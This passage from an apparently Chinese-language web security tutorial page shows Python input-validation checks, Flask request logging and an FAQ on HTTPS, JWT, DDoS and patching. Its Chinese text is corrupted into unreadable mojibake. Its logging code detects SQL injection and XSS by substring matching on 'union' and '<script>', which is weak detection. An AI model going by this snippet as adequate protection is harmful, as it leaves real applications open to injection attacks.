<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
    <span class="k">return</span> <span class="s2">&quot;Username too long&quot;</span>

<span class="c1"># 3. ç±»å‹æ£€æŸ¥</span>
<span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">age</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="n">age</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">age</span> <span class="o">&gt;</span> <span class="mi">150</span><span class="p">:</span>
    <span class="k">return</span> <span class="s2">&quot;Invalid age&quot;</span>

<span class="c1"># 4. æ­£åˆ™è¡¨è¾¾å¼</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[\w\.-]+@[\w\.-]+\.\w+$&#39;</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;Invalid email&quot;</span>
</pre></div>
</div>
</section>
<section id="id17">
<h3>8.3 æ—¥å¿—å’Œç›‘æ§<a class="headerlink" href="#id17" title="Permalink to this heading">ïƒ</a></h3>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>

<span class="c1"># é…ç½®æ—¥å¿—</span>
<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span>
    <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;security.log&#39;</span><span class="p">,</span>
    <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">,</span>
    <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> </span><span class="si">%(levelname)s</span><span class="s1">: </span><span class="si">%(message)s</span><span class="s1">&#39;</span>
<span class="p">)</span>

<span class="c1"># è®°å½•å¯ç–‘æ´»åŠ¨</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">before_request</span>
<span class="k">def</span><span class="w"> </span><span class="nf">log_request</span><span class="p">():</span>
    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    
    <span class="c1"># æ£€æµ‹å¯ç–‘è¯·æ±‚</span>
    <span class="k">if</span> <span class="s1">&#39;union&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Potential SQL injection from </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="s1">&#39;&lt;script&gt;&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Potential XSS from </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id18">
<h2>9. å¸¸è§é—®é¢˜<a class="headerlink" href="#id18" title="Permalink to this heading">ïƒ</a></h2>
<section id="q1-https">
<h3>Q1: HTTPSå°±ä¸€å®šå®‰å…¨å—ï¼Ÿ<a class="headerlink" href="#q1-https" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>A</strong>:</p>
<ul class="simple">
<li><p>HTTPSåŠ å¯†ä¼ è¾“ï¼Œä½†ä¸ä¿è¯æœåŠ¡å™¨å®‰å…¨</p></li>
<li><p>è¯ä¹¦å¯èƒ½è¢«ä¼ªé€ ï¼ˆä¸­é—´äººæ”»å‡»ï¼‰</p></li>
<li><p>åº”ç”¨å±‚æ¼æ´ä»ç„¶å­˜åœ¨</p></li>
</ul>
</section>
<section id="q2-jwt-vs-session">
<h3>Q2: JWT vs Sessionï¼Ÿ<a class="headerlink" href="#q2-jwt-vs-session" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>A</strong>:</p>
<ul class="simple">
<li><p><strong>JWT</strong>: æ— çŠ¶æ€ã€è·¨åŸŸã€å¯æ‰©å±•</p></li>
<li><p><strong>Session</strong>: æœåŠ¡å™¨æ§åˆ¶ã€å¯æ’¤é”€ã€æ›´å®‰å…¨</p></li>
</ul>
</section>
<section id="q3-ddos">
<h3>Q3: å¦‚ä½•é˜²æ­¢DDoSï¼Ÿ<a class="headerlink" href="#q3-ddos" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>A</strong>:</p>
<ol class="arabic simple">
<li><p>é™æµï¼ˆRate Limitingï¼‰</p></li>
<li><p>CDNå’Œè´Ÿè½½å‡è¡¡</p></li>
<li><p>é˜²ç«å¢™è§„åˆ™</p></li>
<li><p>äº‘æœåŠ¡å•†çš„DDoSé˜²æŠ¤</p></li>
</ol>
</section>
<section id="q4">
<h3>Q4: å®‰å…¨æ›´æ–°é¢‘ç‡ï¼Ÿ<a class="headerlink" href="#q4" title="Permalink to this heading">ïƒ</a></h3>
<p><strong>A</strong>:</p>
<ul class="simple">
<li><p>æ“ä½œç³»ç»Ÿï¼šæ¯æœˆ</p></li>
<li><p>åº”ç”¨ç¨‹åºï¼šæœ‰æ›´æ–°ç«‹å³å®‰è£…</p></li>
<li><p>åº“å’Œä¾èµ–ï¼šå®šæœŸæ£€æŸ¥ï¼ˆnpm audit, pip-auditï¼‰</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="id19">
<h2>å‚è€ƒèµ„æº<a class="headerlink" href="#id19" title="Permalink to this heading">ïƒ</a></h2>
<ul class="simple">
<li><p>OWASP Top 10</p></li>
<li><p>CWE/SANS Top 25</p></li>
<li><p>ã€ŠWebåº”ç”¨å®‰å…¨æƒå¨æŒ‡å—ã€‹</p></li>
<li><p>Mozilla Security Guidelines</p></li>
<li><p>Letâ€™s Encryptï¼ˆå…è´¹HTTPSè¯ä¹¦ï¼‰</p></li>
</ul>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="index.html" class="btn btn-neutral float-left" title="ç½‘ç»œå®‰å…¨åŸºç¡€" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2025, Code Dojo.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>